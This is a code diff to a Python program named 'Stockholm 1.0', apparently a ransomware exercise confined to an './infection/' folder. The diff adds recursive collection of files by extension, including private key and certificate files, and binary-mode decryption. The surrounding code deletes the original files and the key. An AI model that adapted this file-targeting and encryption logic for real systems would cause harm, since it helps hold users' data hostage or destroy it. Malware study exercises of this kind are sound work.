@@ -3,6 +3,7 @@ import os
 import time
 from colorama import Fore
 import argparse
+from sys import exit
 
 file_extensions = [
     '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
@@ -87,7 +88,7 @@ def decrypt_files(all_files, silent):
             print(Fore.GREEN + file, "Decrypting..." ,Fore.RESET)
             time.sleep(0.05)
 
-        with open (file, 'r') as file_crypto:
+        with open (file, 'rb') as file_crypto:
             file_data = file_crypto.read()
 
         file_content = cryptography.decrypt(file_data)
@@ -117,20 +118,21 @@ def remove_encrypted_files(all_files):
         os.remove(file)
     os.remove('key')
 
-def select_files_with_good_extension(reverse):
+def select_files_with_good_extension(reverse, path = './infection/', files = []):
     '''
     Select all files with good extension
     '''
-    all_files = os.listdir()
-    files = []
+    all_files = os.listdir(path)
     for file in all_files:
+        if os.path.isdir(os.path.join(path, file)):
+            select_files_with_good_extension(reverse, path + file + "/", files)
         if reverse == False:
             for extension in file_extensions:
                 if file.endswith(extension):
-                    files.append(file)
+                    files.append(path + file)
         else:
             if file.endswith('.ft'):
-                files.append(file)
+                files.append(path + file)
     return files
 
 def do_parse():
@@ -148,6 +150,7 @@ def do_parse():
 def main():
     args = do_parse()
     all_files = select_files_with_good_extension(args.reverse)
+    print("All files: ", all_files)
     if (args.version):
         print("Stockholm 1.0")
         exit(0)
